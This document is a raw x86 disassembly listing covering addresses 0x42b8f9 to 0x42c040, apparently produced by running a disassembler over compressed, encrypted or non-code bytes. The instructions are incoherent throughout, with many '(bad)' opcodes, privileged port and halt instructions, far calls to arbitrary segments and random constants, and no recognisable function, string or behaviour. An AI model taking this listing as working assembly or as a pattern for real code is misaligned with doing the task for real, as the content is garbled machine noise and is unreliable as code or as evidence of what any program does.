  42b8f9:	jnp    0x42b95b
  42b8fb:	loope  0x42b8d2
  42b8fd:	ja     0x42b8fa
  42b8ff:	mov    ds:0xa32e2041,al
  42b904:	mov    ch,0x5
  42b906:	mov    esp,0x183a39c4
  42b90b:	fisttp WORD PTR [ebp+0x2a]
  42b90e:	popa   
  42b90f:	and    esp,esp
  42b911:	(bad)  
  42b912:	inc    ebp
  42b913:	ror    BYTE PTR [esi+0x2d],cl
  42b916:	aas    
  42b917:	jnp    0x42b8af
  42b919:	test   DWORD PTR ds:0xccfd88c7,edx
  42b91f:	cli    
  42b920:	mov    esp,0xc2a992e2
  42b925:	add    eax,0x8115615e
  42b92a:	inc    edx
  42b92b:	push   edi
  42b92c:	cld    
  42b92d:	sbb    bl,BYTE PTR [edi]
  42b92f:	jns    0x42b94b
  42b931:	push   0xbe145029
  42b936:	push   cs
  42b937:	sahf   
  42b938:	mov    ebp,0x61d420ec
  42b93d:	cwde   
  42b93e:	fld    QWORD PTR [esi-0x4e0d4da]
  42b944:	xor    eax,0xae1d4909
  42b949:	dec    ecx
  42b94a:	mov    ch,0xd5
  42b94c:	mov    eax,ds:0x191328b2
  42b951:	push   0x20
  42b953:	mov    cs,WORD PTR [ecx-0x593e3739]
  42b959:	adc    eax,0x2b23943
  42b95e:	rcl    BYTE PTR [esi+0x2118d02a],0x26
  42b965:	push   ss
  42b966:	ins    BYTE PTR es:[edi],dx
  42b967:	sub    ecx,DWORD PTR [esi+ebp*1+0x62]
  42b96b:	push   ebx
  42b96c:	dec    eax
  42b96d:	sar    BYTE PTR [ebx+0x1a05dd1b],cl
  42b973:	rcl    BYTE PTR [edx],0x84
  42b976:	fwait
  42b977:	(bad)  
  42b978:	(bad)  
  42b979:	in     al,dx
  42b97a:	pusha  
  42b97b:	packssdw mm1,mm4
  42b97e:	mul    DWORD PTR [ebx]
  42b980:	inc    eax
  42b981:	imul   ebp,DWORD PTR [ebp-0x2db7282b],0xffffff89
  42b988:	hlt    
  42b989:	ret    
  42b98a:	mov    ds:0x411ff61f,al
  42b98f:	aam    0x57
  42b991:	ins    BYTE PTR es:[edi],dx
  42b992:	in     eax,0x92
  42b994:	ss (bad) 
  42b997:	mov    edx,0xccad1a30
  42b99c:	cmc    
  42b99d:	add    bl,cl
  42b99f:	inc    esi
  42b9a0:	fdivr  DWORD PTR [ebx+0x5c]
  42b9a3:	je     0x42b92d
  42b9a5:	cmp    ebp,DWORD PTR [ebx]
  42b9a7:	loopne 0x42b944
  42b9a9:	and    dh,ah
  42b9ab:	dec    ebx
  42b9ac:	xchg   esp,eax
  42b9ad:	das    
  42b9ae:	mov    esi,0x6eed095b
  42b9b3:	sub    DWORD PTR [ebx],ecx
  42b9b5:	mov    ds:0xc456e7cc,eax
  42b9ba:	pop    ds
  42b9bb:	dec    ecx
  42b9bc:	jne    0x42b991
  42b9be:	popa   
  42b9bf:	mov    dl,0xe0
  42b9c1:	and    ebp,DWORD PTR [edx-0x2b]
  42b9c4:	adc    cl,ah
  42b9c6:	pop    es
  42b9c7:	(bad)  
  42b9c8:	call   FWORD PTR [ecx-0x50779042]
  42b9ce:	in     eax,dx
  42b9cf:	mov    dl,dl
  42b9d1:	scas   al,BYTE PTR es:[edi]
  42b9d2:	lds    edi,FWORD PTR [ecx-0x68]
  42b9d5:	add    eax,0x8b31ea8a
  42b9da:	cwde   
  42b9db:	xor    eax,0xeb9c3acd
  42b9e0:	adc    bl,BYTE PTR [esi]
  42b9e2:	mov    esp,0xf6dad0c8
  42b9e7:	push   ebp
  42b9e8:	loop   0x42ba44
  42b9ea:	xchg   edi,eax
  42b9eb:	test   al,0x91
  42b9ed:	add    edx,DWORD PTR [ecx+esi*8+0x351fe2ff]
  42b9f4:	jmp    0x45d2:0xac04151b
  42b9fb:	aam    0xea
  42b9fd:	push   ss
  42b9fe:	push   0x48
  42ba00:	dec    ecx
  42ba01:	bound  edi,QWORD PTR [eax]
  42ba03:	js     0x42b98e
  42ba05:	inc    ecx
  42ba06:	or     cl,BYTE PTR [ebx+0x6c]
  42ba09:	sbb    BYTE PTR [esi],dl
  42ba0b:	cdq    
  42ba0c:	inc    eax
  42ba0d:	add    dh,al
  42ba0f:	cmc    
  42ba10:	inc    ebx
  42ba11:	popf   
  42ba12:	leave  
  42ba13:	fbstp  TBYTE PTR [ecx]
  42ba15:	ins    DWORD PTR es:[edi],dx
  42ba16:	jnp    0x42b9f1
  42ba18:	pop    edx
  42ba19:	push   0xffffffb1
  42ba1b:	xchg   ebp,eax
  42ba1c:	adc    BYTE PTR [ecx],ah
  42ba1e:	stc    
  42ba1f:	add    al,BYTE PTR [eax+0x2]
  42ba22:	int3   
  42ba23:	sbb    DWORD PTR [eax*1-0x75a2da35],esp
  42ba2a:	cmp    BYTE PTR [edi-0xb661a78],al
  42ba30:	xlat   BYTE PTR ds:[ebx]
  42ba31:	les    edx,FWORD PTR [esi+0x3414c08a]
  42ba37:	inc    edi
  42ba38:	enter  0x6cd1,0x94
  42ba3c:	sbb    edx,edi
  42ba3e:	pop    ecx
  42ba3f:	mov    edx,0xd8757db6
  42ba44:	cmpxchg DWORD PTR [edi+0x5f],ecx
  42ba48:	rcl    BYTE PTR [edx],0xcf
  42ba4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ba4c:	stos   DWORD PTR es:[edi],eax
  42ba4d:	add    eax,0xf45fcc50
  42ba52:	lahf   
  42ba53:	sub    al,0x73
  42ba55:	aas    
  42ba56:	push   ds
  42ba57:	xchg   ecx,eax
  42ba58:	fadd   st(0),st
  42ba5a:	imul   edi,ecx,0xaa5a5e16
  42ba60:	clc    
  42ba61:	xor    BYTE PTR [ebx-0x29fcc0cc],al
  42ba67:	dec    eax
  42ba68:	add    DWORD PTR [esp+ebx*2+0xd],ebp
  42ba6c:	dec    ecx
  42ba6d:	fcomp  QWORD PTR [edi]
  42ba6f:	pop    esi
  42ba70:	data16 xchg BYTE PTR [esi],dh
  42ba73:	mov    edi,0x20fa2438
  42ba78:	imul   edx,DWORD PTR [esi+0x1afbe1df],0x52
  42ba7f:	addr16 inc ebp
  42ba81:	adc    DWORD PTR [esi],ebx
  42ba83:	sub    esp,DWORD PTR [eax+0x2d]
  42ba86:	push   0x4a
  42ba88:	bound  esi,QWORD PTR [ebp+0x7983d4b5]
  42ba8e:	cmp    al,0x22
  42ba90:	test   BYTE PTR [edi],dh
  42ba92:	or     esi,DWORD PTR ds:0x58acb789
  42ba98:	pop    esp
  42ba99:	and    DWORD PTR [ecx+0x68034eff],edi
  42ba9f:	xor    al,0xa9
  42baa1:	mov    sp,WORD PTR [ebx+0x53]
  42baa5:	retf   0x61b
  42baa8:	mov    BYTE PTR ds:0x11c48a3d,bl
  42baae:	repz fadd st(6),st
  42bab1:	inc    edi
  42bab2:	ins    BYTE PTR es:[edi],dx
  42bab3:	or     BYTE PTR [eax-0x6d3ee47b],bl
  42bab9:	pop    ss
  42baba:	mov    eax,0xe3718fc9
  42babf:	fs xor al,0x49
  42bac2:	sub    edx,DWORD PTR [ebx+eax*1]
  42bac5:	inc    ebx
  42bac6:	clc    
  42bac7:	xchg   esp,eax
  42bac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bac9:	call   0x80fb8f70
  42bace:	hlt    
  42bacf:	push   ss
  42bad0:	push   es
  42bad1:	sub    eax,0x1bf3555a
  42bad6:	mov    bl,BYTE PTR [eax]
  42bad8:	push   0x33badc5f
  42badd:	jbe    0x42bb49
  42badf:	stos   DWORD PTR es:[edi],eax
  42bae0:	or     ecx,edx
  42bae2:	jnp    0x42bb58
  42bae4:	pop    ebx
  42bae5:	shl    DWORD PTR [ebx],cl
  42bae7:	pop    ecx
  42bae8:	xchg   BYTE PTR [ebx-0x7ea0707c],bl
  42baee:	lahf   
  42baef:	into   
  42baf0:	(bad)  
  42baf2:	(bad)  
  42baf4:	mov    al,ds:0x30df5800
  42baf9:	imul   DWORD PTR [edx+0x6d]
  42bafc:	mov    BYTE PTR [ecx],bl
  42bafe:	pop    ss
  42baff:	popf   
  42bb00:	cmp    BYTE PTR [esi+0x375ec00],0x9c
  42bb07:	pop    ecx
  42bb08:	shr    BYTE PTR [ebp-0x7b],1
  42bb0b:	mov    eax,0x9f1fa103
  42bb10:	jns    0x42ba92
  42bb12:	inc    ecx
  42bb13:	cld    
  42bb14:	pushf  
  42bb15:	test   al,0x3a
  42bb17:	aam    0x77
  42bb19:	fstp   TBYTE PTR [ecx+0x7b]
  42bb1c:	nop
  42bb1d:	or     BYTE PTR [ecx],dh
  42bb1f:	call   0xa7e5:0xcc2cb86
  42bb26:	ret    0x6f0a
  42bb29:	or     al,0x0
  42bb2b:	(bad)  
  42bb2c:	scas   eax,DWORD PTR es:[edi]
  42bb2d:	add    eax,0x4fde93d2
  42bb32:	pop    esp
  42bb33:	adc    al,0xdb
  42bb35:	out    0x1f,al
  42bb37:	dec    ebx
  42bb38:	or     BYTE PTR [esi+0x38e4f9de],0xf9
  42bb3f:	aam    0xda
  42bb41:	adc    DWORD PTR [edi-0x3f],ebx
  42bb44:	test   BYTE PTR [ebx+ecx*1+0x27],cl
  42bb48:	dec    ebp
  42bb49:	fstp   QWORD PTR [edi]
  42bb4b:	imul   ebx,DWORD PTR [eax],0xffffffd2
  42bb4e:	(bad)  
  42bb4f:	adc    eax,DWORD PTR ss:[edx]
  42bb52:	inc    ebx
  42bb53:	pop    eax
  42bb54:	mov    ch,0x52
  42bb56:	push   ds
  42bb57:	and    BYTE PTR [esi+esi*8+0x21],dl
  42bb5b:	cs dec edx
  42bb5d:	fist   WORD PTR [ecx]
  42bb5f:	jo     0x42bae9
  42bb61:	adc    DWORD PTR [ebp+0xe6432c2],esp
  42bb67:	enter  0x224,0xe2
  42bb6b:	lock xchg DWORD PTR ss:[edi+0x1e30fb58],ebx
  42bb73:	mov    ds:0xbc067db7,eax
  42bb78:	jmp    0x9c68b6f3
  42bb7d:	pop    eax
  42bb7e:	pop    ds
  42bb7f:	(bad)  
  42bb81:	pop    esi
  42bb82:	pop    esp
  42bb83:	(bad)  
  42bb84:	push   ebp
  42bb85:	in     eax,dx
  42bb86:	ins    DWORD PTR es:[edi],dx
  42bb87:	push   ebx
  42bb88:	adc    esp,DWORD PTR [esi]
  42bb8a:	cmc    
  42bb8b:	dec    edi
  42bb8c:	call   0x6793548d
  42bb91:	add    edi,DWORD PTR [eax+0x1dd5f847]
  42bb97:	sbb    cl,BYTE PTR [ebp+ebp*1+0x58d0fd71]
  42bb9e:	arpl   WORD PTR [esi-0x3b2dfd52],sp
  42bba4:	push   cs
  42bba5:	mov    dh,0xdc
  42bba7:	aad    0x8b
  42bba9:	mov    al,ds:0x179a8d16
  42bbae:	loopne 0x42bc25
  42bbb0:	mov    BYTE PTR [edi-0x4d],dl
  42bbb3:	nop
  42bbb4:	jns    0x42bb84
  42bbb6:	lea    ebx,[edi+0x639202be]
  42bbbc:	adc    esi,DWORD PTR [ebx]
  42bbbe:	dec    esp
  42bbbf:	push   ds
  42bbc0:	sbb    ecx,DWORD PTR [ebx+0x67887f30]
  42bbc6:	stos   DWORD PTR es:[edi],eax
  42bbc7:	mov    bh,0x69
  42bbc9:	xchg   edx,eax
  42bbca:	push   eax
  42bbcb:	nop
  42bbcc:	aas    
  42bbcd:	push   0xffffffc0
  42bbcf:	inc    edi
  42bbd0:	sub    DWORD PTR [edx],eax
  42bbd2:	ficomp WORD PTR [ebp+0x4264d647]
  42bbd8:	mov    DWORD PTR [ebx],ebx
  42bbda:	idiv   DWORD PTR [ecx]
  42bbdc:	push   esi
  42bbdd:	leave  
  42bbde:	popf   
  42bbdf:	mov    ecx,0xcc2669b
  42bbe4:	cdq    
  42bbe5:	add    eax,0x25ab0052
  42bbea:	mov    esp,0x474d880e
  42bbef:	cdq    
  42bbf0:	jmp    ecx
  42bbf2:	retf   0x352c
  42bbf5:	mov    DWORD PTR [ecx],esi
  42bbf7:	jmp    0x2c85a584
  42bbfc:	sub    bl,BYTE PTR [eax-0x7476e2bb]
  42bc02:	mov    ecx,0xc18b1a7c
  42bc07:	ds xchg esi,eax
  42bc09:	dec    eax
  42bc0a:	and    al,0xc6
  42bc0c:	sub    al,0x1d
  42bc0e:	mov    WORD PTR [ecx-0x33e32f56],cs
  42bc14:	popa   
  42bc15:	fisub  WORD PTR [eax-0x4d]
  42bc18:	shr    BYTE PTR [ebx+0x25],cl
  42bc1b:	dec    esi
  42bc1c:	outs   dx,DWORD PTR ds:[esi]
  42bc1d:	(bad)  
  42bc1e:	or     BYTE PTR [edx-0x2f],al
  42bc21:	jge    0x42bbc0
  42bc23:	xchg   esi,eax
  42bc24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc25:	xor    ebp,DWORD PTR [edi+0x19fda8e2]
  42bc2b:	mov    ebx,0x559dda16
  42bc30:	cwde   
  42bc31:	dec    ebx
  42bc32:	add    DWORD PTR [ebp-0x778bfd58],edi
  42bc38:	xor    ch,ah
  42bc3a:	mov    ebx,0x1e1fa31f
  42bc3f:	retf   
  42bc40:	adc    esi,DWORD PTR [edx+0xe]
  42bc43:	sahf   
  42bc44:	bound  edi,QWORD PTR [esi-0x5d0d2a5a]
  42bc4a:	std    
  42bc4b:	lahf   
  42bc4c:	jmp    DWORD PTR [eax-0x3b]
  42bc4f:	enter  0xaf88,0xb5
  42bc53:	stc    
  42bc54:	jne    0x42bc92
  42bc56:	inc    esp
  42bc57:	inc    esi
  42bc58:	pop    ebp
  42bc59:	adc    al,0xb0
  42bc5b:	sbb    ebp,ebx
  42bc5d:	sti    
  42bc5e:	cmp    eax,0x4fda5f37
  42bc63:	lods   eax,DWORD PTR ds:[esi]
  42bc64:	mov    DWORD PTR [ebp+0x4d],ebp
  42bc67:	and    eax,0x5d8393c2
  42bc6c:	or     eax,DWORD PTR [ebp+0x78850af]
  42bc72:	xchg   BYTE PTR [esi],bh
  42bc74:	pushf  
  42bc75:	dec    ecx
  42bc76:	sub    cl,BYTE PTR [edi+0x75c13388]
  42bc7c:	adc    al,0x36
  42bc7e:	lahf   
  42bc7f:	mov    BYTE PTR [ecx-0x4f52f40],al
  42bc85:	add    eax,0x3fee342a
  42bc8a:	lock pop esi
  42bc8c:	pop    ecx
  42bc8d:	jne    0x42bcce
  42bc8f:	test   al,0x9a
  42bc91:	das    
  42bc92:	xor    esp,DWORD PTR [eax-0x5]
  42bc95:	add    ah,BYTE PTR [edx]
  42bc97:	or     dl,BYTE PTR [edx]
  42bc99:	data16 mov ch,dl
  42bc9c:	stos   DWORD PTR es:[edi],eax
  42bc9d:	ret    
  42bc9e:	scas   eax,DWORD PTR es:[edi]
  42bc9f:	(bad)  [ebp+eiz*2+0x2]
  42bca3:	xor    al,BYTE PTR [esi-0x47b10ce7]
  42bca9:	cmp    eax,0xa4499c40
  42bcae:	sub    BYTE PTR [ecx+0x2b],ah
  42bcb1:	add    ebx,DWORD PTR [esp+ecx*1+0x69]
  42bcb5:	nop
  42bcb6:	mov    eax,0x1e7936bc
  42bcbb:	repz xchg esp,eax
  42bcbd:	outs   dx,DWORD PTR ds:[esi]
  42bcbe:	cmp    DWORD PTR [eax],ebp
  42bcc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bcc1:	jle    0x42bcc6
  42bcc3:	aam    0xc3
  42bcc5:	push   ecx
  42bcc6:	das    
  42bcc7:	mov    eax,ds:0x358403de
  42bccc:	mov    ss,ebp
  42bcce:	mov    edi,0x7f911ba2
  42bcd3:	mov    ch,0x92
  42bcd5:	xchg   esp,eax
  42bcd6:	rcl    edx,1
  42bcd8:	dec    ebp
  42bcd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bcda:	fs sbb eax,0x605fe65e
  42bce0:	xchg   ebp,eax
  42bce1:	cmp    al,0x1e
  42bce3:	and    eax,0x34fac635
  42bce8:	xchg   ebx,eax
  42bce9:	push   cs
  42bcea:	es addr16 clc 
  42bced:	cmp    edx,ecx
  42bcef:	aam    0x78
  42bcf1:	sub    ebx,DWORD PTR [eax-0x1b]
  42bcf4:	xor    DWORD PTR [esi+eax*8+0x623389c0],edx
  42bcfb:	mov    eax,0x3e9d08b7
  42bd00:	stos   BYTE PTR es:[edi],al
  42bd01:	add    ch,BYTE PTR [eax+0x1e]
  42bd04:	imul   eax,DWORD PTR ds:0xc04036f3,0xfc4ff1f
  42bd0e:	xor    BYTE PTR [esi],ah
  42bd10:	cs inc esi
  42bd12:	ss sar esi,1
  42bd15:	pop    eax
  42bd16:	retf   0xe430
  42bd19:	inc    ebx
  42bd1a:	pop    ds
  42bd1b:	push   esp
  42bd1c:	es pop ds
  42bd1e:	addr16 sub edi,ebx
  42bd21:	pop    edx
  42bd22:	jae    0x42bd08
  42bd24:	mov    DWORD PTR [edx-0x6d],edi
  42bd27:	outs   dx,DWORD PTR ds:[esi]
  42bd28:	scas   al,BYTE PTR es:[edi]
  42bd29:	or     DWORD PTR [esi+0x51a8a9d4],ebx
  42bd2f:	adc    DWORD PTR [eax+ebp*8+0x7f],0x1
  42bd34:	mov    BYTE PTR [edi+0x289c05d7],dh
  42bd3a:	push   cs
  42bd3b:	xor    al,0x96
  42bd3d:	dec    ecx
  42bd3e:	ds push ss
  42bd40:	push   ebp
  42bd41:	inc    edi
  42bd42:	stos   DWORD PTR es:[edi],eax
  42bd43:	aam    0xd8
  42bd45:	add    ebx,0xffffff9e
  42bd48:	mov    cl,0xd7
  42bd4a:	pusha  
  42bd4b:	daa    
  42bd4c:	aas    
  42bd4d:	in     al,0x92
  42bd4f:	dec    ebx
  42bd50:	sahf   
  42bd51:	inc    eax
  42bd52:	pop    ebp
  42bd53:	(bad)  
  42bd54:	inc    edx
  42bd55:	(bad)  
  42bd56:	xlat   BYTE PTR ds:[ebx]
  42bd57:	and    BYTE PTR [edx+0x68e597cb],ah
  42bd5d:	mov    cl,0x1f
  42bd5f:	in     eax,0x79
  42bd61:	mov    ss,WORD PTR [eax+0x7a]
  42bd64:	pop    esi
  42bd65:	aad    0x1f
  42bd67:	sar    BYTE PTR [esi+0x5c5cfe1],cl
  42bd6d:	sbb    ch,BYTE PTR [esi+0x1cd210b2]
  42bd73:	leave  
  42bd74:	mov    BYTE PTR [ebp-0x25697257],cl
  42bd7a:	mov    cl,0xf
  42bd7c:	pop    eax
  42bd7d:	add    ch,BYTE PTR [eax+0x62]
  42bd80:	pop    ss
  42bd81:	stos   BYTE PTR es:[edi],al
  42bd82:	dec    edx
  42bd83:	mov    WORD PTR [edi],?
  42bd85:	xor    ebx,DWORD PTR [eax+0x23]
  42bd88:	push   esp
  42bd89:	mul    DWORD PTR [eax-0x6b]
  42bd8c:	push   0xffffffbe
  42bd8e:	push   ebp
  42bd8f:	xlat   BYTE PTR ds:[ebx]
  42bd90:	jl     0x42bd25
  42bd92:	push   edi
  42bd93:	mov    bl,0x89
  42bd95:	lods   eax,DWORD PTR ds:[esi]
  42bd96:	xchg   edi,eax
  42bd97:	imul   eax,DWORD PTR [edx],0x899b178f
  42bd9d:	sub    eax,0x8fc94405
  42bda2:	mov    esp,0x740287e3
  42bda7:	sub    al,0x15
  42bda9:	mov    ah,0x10
  42bdab:	adc    eax,0xbf6c2b16
  42bdb0:	dec    edx
  42bdb1:	pop    ss
  42bdb2:	and    al,0x67
  42bdb4:	das    
  42bdb5:	cmp    BYTE PTR [esi-0x17818b4c],0xd4
  42bdbc:	pop    esi
  42bdbd:	adc    eax,0x937e321e
  42bdc2:	mov    cl,BYTE PTR ds:0x351e6771
  42bdc8:	push   esi
  42bdc9:	pushf  
  42bdca:	fs jae 0x42bdc7
  42bdcd:	xchg   edi,eax
  42bdce:	mov    ecx,0xcad147d7
  42bdd3:	aas    
  42bdd4:	ins    BYTE PTR es:[edi],dx
  42bdd5:	adc    DWORD PTR ds:0x62b32337,edi
  42bddb:	das    
  42bddc:	sbb    eax,0xb778d86d
  42bde1:	aad    0x20
  42bde3:	push   esi
  42bde4:	push   esp
  42bde5:	add    DWORD PTR [eax],ebx
  42bde7:	mov    esp,0xa36b3b00
  42bdec:	xchg   dl,ch
  42bdee:	cld    
  42bdef:	xchg   DWORD PTR [eax-0x10ec679b],ecx
  42bdf5:	add    esi,esi
  42bdf7:	test   BYTE PTR [edx+0x70],bl
  42bdfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bdfb:	adc    ecx,esi
  42bdfd:	dec    esi
  42bdfe:	push   ds
  42bdff:	icebp  
  42be00:	push   0xaf19dd71
  42be05:	outs   dx,DWORD PTR ds:[esi]
  42be06:	pop    eax
  42be07:	gs inc ebp
  42be09:	mov    ebp,0xcf080e9f
  42be0e:	(bad)  
  42be0f:	shr    BYTE PTR [ebx-0x7742cddc],cl
  42be15:	and    BYTE PTR [eax+0x22f63bdf],0xc
  42be1c:	mov    DWORD PTR [ebx+0x5a8c3f71],eax
  42be22:	rcr    DWORD PTR [edx+ebx*8-0x73],cl
  42be26:	xlat   BYTE PTR ds:[ebx]
  42be27:	mov    ds:0x84195b88,al
  42be2c:	add    al,dh
  42be2e:	les    ebx,FWORD PTR [ebx]
  42be30:	jno    0x42be0e
  42be32:	sub    al,0x99
  42be34:	mov    DWORD PTR [edi],edi
  42be36:	jae    0x42be22
  42be38:	mov    al,0x17
  42be3a:	xchg   ecx,eax
  42be3b:	lea    esp,[si]
  42be3e:	outs   dx,BYTE PTR ds:[esi]
  42be3f:	mov    ecx,edi
  42be41:	cs pop eax
  42be43:	push   ebp
  42be44:	sbb    eax,DWORD PTR [esi+0x482c205d]
  42be4a:	push   ds
  42be4b:	pop    ebx
  42be4c:	add    al,0xa4
  42be4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be4f:	call   0xba69:0xd451ec7a
  42be56:	popa   
  42be57:	dec    ecx
  42be58:	adc    eax,0x895c0ecc
  42be5d:	or     DWORD PTR [eax+0x28],edi
  42be60:	lods   al,BYTE PTR ds:[esi]
  42be61:	pop    ss
  42be62:	or     DWORD PTR [eax-0x416598a8],eax
  42be68:	xchg   BYTE PTR ds:0x92eb1efa,al
  42be6e:	(bad)  
  42be6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be70:	mov    BYTE PTR [ecx],dl
  42be72:	cld    
  42be73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be75:	mov    ds:0x15214206,eax
  42be7a:	mov    dh,0x82
  42be7c:	call   0xf883:0x3616fdb3
  42be83:	int    0xe5
  42be85:	xchg   ebx,eax
  42be86:	jle    0x42be97
  42be88:	cmp    al,BYTE PTR [ebx+0x7d]
  42be8b:	imul   esi,DWORD PTR [ebp-0x7d61c6f],0xffffffc5
  42be92:	xlat   BYTE PTR ds:[ebx]
  42be93:	xor    eax,0x9ab18fe2
  42be98:	mov    ebx,edi
  42be9a:	addr16 sub al,0xa9
  42be9d:	jnp    0x42bf0a
  42be9f:	xchg   esp,eax
  42bea0:	mov    es,WORD PTR [ebx-0x3695ff4d]
  42bea6:	pop    es
  42bea7:	hlt    
  42bea8:	aam    0x5
  42beaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42beab:	aam    0x77
  42bead:	aad    0x98
  42beaf:	dec    eax
  42beb0:	sbb    al,0xda
  42beb2:	fisubr WORD PTR [esi-0x43987849]
  42beb8:	jg     0xe2c591c3
  42bebe:	jbe    0x42be8b
  42bec0:	ja     0x42bec5
  42bec2:	ret    0xc846
  42bec5:	mov    esi,0xf49839b
  42beca:	or     BYTE PTR [esi+0x20a5fbc1],al
  42bed0:	mov    DWORD PTR [edi],eax
  42bed2:	dec    ebx
  42bed3:	or     dl,BYTE PTR [eax+0x21]
  42bed6:	imul   DWORD PTR [ebp-0x5cb5560]
  42bedc:	in     eax,0x82
  42bede:	cmp    BYTE PTR [ecx],ah
  42bee0:	and    al,0x8a
  42bee2:	pusha  
  42bee3:	popf   
  42bee4:	(bad)  
  42bee5:	cmp    al,0x40
  42bee7:	dec    edi
  42bee8:	mov    dl,0xc5
  42beea:	mov    ebx,0x615a4ed5
  42beef:	stos   BYTE PTR es:[edi],al
  42bef0:	jecxz  0x42be73
  42bef2:	push   ds
  42bef3:	fnsave [eax]
  42bef5:	inc    esp
  42bef6:	adc    DWORD PTR [edi+eiz*2-0x7108caec],ecx
  42befd:	xchg   edi,eax
  42befe:	pop    ss
  42beff:	(bad)  
  42bf00:	mov    edx,0xe2e6eb3c
  42bf05:	ret    0xdf5f
  42bf08:	fadd   QWORD PTR ds:0x778ea758
  42bf0e:	(bad)
  42bf11:	call   0x53f1476
  42bf16:	fsubr  QWORD PTR [edx-0x7e]
  42bf19:	mov    al,ds:0x589ad607
  42bf1e:	cld    
  42bf1f:	sar    BYTE PTR [esi-0x68],0xd7
  42bf23:	xchg   esp,eax
  42bf24:	or     eax,0x56656634
  42bf29:	jbe    0x42bf43
  42bf2b:	push   es
  42bf2c:	xchg   BYTE PTR [eax],bl
  42bf2e:	pop    ds
  42bf2f:	jno    0x42bf95
  42bf31:	push   ebp
  42bf32:	dec    esi
  42bf33:	aam    0xc9
  42bf35:	inc    esp
  42bf36:	mov    bl,0x2b
  42bf38:	clc    
  42bf39:	out    dx,eax
  42bf3a:	shl    BYTE PTR [ebx],1
  42bf3c:	mov    ebp,ebp
  42bf3e:	add    eax,0x6d4c0433
  42bf43:	std    
  42bf44:	adc    DWORD PTR [ebx],eax
  42bf46:	jle    0x42becd
  42bf48:	mov    ah,0xa0
  42bf4a:	cdq    
  42bf4b:	fldcw  WORD PTR [ecx]
  42bf4d:	xchg   edx,eax
  42bf4e:	xlat   BYTE PTR ds:[ebx]
  42bf4f:	pop    ss
  42bf50:	lods   al,BYTE PTR ds:[esi]
  42bf51:	add    dh,dl
  42bf53:	mul    DWORD PTR [eax+esi*1-0x10]
  42bf57:	lds    esi,FWORD PTR [eax+0x70]
  42bf5a:	bound  esp,QWORD PTR [eax+ecx*4]
  42bf5d:	jae    0x42beed
  42bf5f:	es adc al,0x52
  42bf62:	aad    0xbc
  42bf64:	mov    bl,dh
  42bf66:	dec    ebp
  42bf67:	dec    esi
  42bf68:	pop    esi
  42bf69:	fmul   QWORD PTR [edx-0x7d86d05]
  42bf6f:	test   DWORD PTR [ebp+0x11],esi
  42bf72:	fidiv  WORD PTR [eax-0x64f690a8]
  42bf78:	xchg   DWORD PTR [ebp+0x78],edx
  42bf7b:	test   BYTE PTR [ecx],bl
  42bf7d:	mov    esp,DWORD PTR [eax-0x60]
  42bf80:	or     dh,BYTE PTR [edi+esi*8-0x2b]
  42bf84:	pop    ebx
  42bf85:	or     BYTE PTR [edx],ch
  42bf87:	test   ebp,eax
  42bf89:	not    DWORD PTR [ebp+0x1f]
  42bf8c:	mov    bl,ch
  42bf8e:	daa    
  42bf8f:	pop    edx
  42bf90:	(bad)  
  42bf91:	sub    ebx,DWORD PTR [ebp-0x7c]
  42bf94:	push   eax
  42bf95:	(bad)  
  42bf97:	aad    0x2b
  42bf99:	call   0x93a0:0x45fb45de
  42bfa0:	mov    BYTE PTR [edi-0x565c856],dh
  42bfa6:	push   ebx
  42bfa7:	xor    eax,0x742a0206
  42bfac:	ss mov ebp,0x43aa78d1
  42bfb2:	popf   
  42bfb3:	jmp    edi
  42bfb5:	sbb    eax,DWORD PTR [eax-0x30]
  42bfb8:	push   ebp
  42bfb9:	imul   edx,DWORD PTR [edx],0xffffffd7
  42bfbc:	cmp    BYTE PTR [eax-0x27],ah
  42bfbf:	sbb    eax,DWORD PTR [edi-0x5a5bfec1]
  42bfc5:	or     al,0xc0
  42bfc7:	call   0xabca6474
  42bfcc:	xchg   edi,eax
  42bfcd:	outs   dx,BYTE PTR ds:[esi]
  42bfce:	outs   dx,BYTE PTR ds:[esi]
  42bfcf:	sub    esp,DWORD PTR [esi]
  42bfd1:	add    esp,ecx
  42bfd3:	mov    ah,0x80
  42bfd5:	jnp    0x42bff5
  42bfd7:	pop    ebp
  42bfd8:	jbe    0x42c01b
  42bfda:	ins    BYTE PTR es:[edi],dx
  42bfdb:	ss (bad) 
  42bfdd:	in     al,0x61
  42bfdf:	aad    0xd1
  42bfe1:	xchg   ecx,eax
  42bfe2:	xor    ch,BYTE PTR [esp+ecx*8]
  42bfe5:	add    cl,ah
  42bfe7:	pop    ds
  42bfe8:	mov    DWORD PTR [ecx+0x475a0eb4],esp
  42bfee:	sbb    al,0x48
  42bff0:	js     0x42c00e
  42bff2:	mov    WORD PTR [edx+0x21],?
  42bff5:	adc    eax,0x48c8dfac
  42bffa:	inc    esi
  42bffb:	adc    cl,BYTE PTR [ecx+0x57fee11d]
  42c001:	sbb    BYTE PTR [edx+0x6802eba6],ch
  42c007:	(bad)  
  42c008:	nop
  42c009:	iret   
  42c00a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c00b:	dec    eax
  42c00c:	push   esp
  42c00d:	push   ebx
  42c00e:	pop    ds
  42c00f:	pop    es
  42c010:	daa    
  42c011:	xchg   BYTE PTR [ecx+0x754ffd3d],ch
  42c017:	repnz push eax
  42c019:	or     ebx,DWORD PTR [esi]
  42c01b:	aam    0xd6
  42c01d:	push   eax
  42c01e:	js     0x42bfd4
  42c020:	inc    esp
  42c021:	loopne 0x42c057
  42c023:	enter  0xc388,0xf0
  42c027:	int3   
  42c028:	mov    ebp,0x36e78e30
  42c02d:	sbb    eax,0x512cc180
  42c032:	(bad)  
  42c034:	pop    eax
  42c035:	fwait
  42c036:	push   esp
  42c037:	inc    ebx
  42c038:	mul    BYTE PTR [ecx+0x6d]
  42c03b:	mov    edx,0x4c92d9d0
  42c040:	loop   0x42c0b4
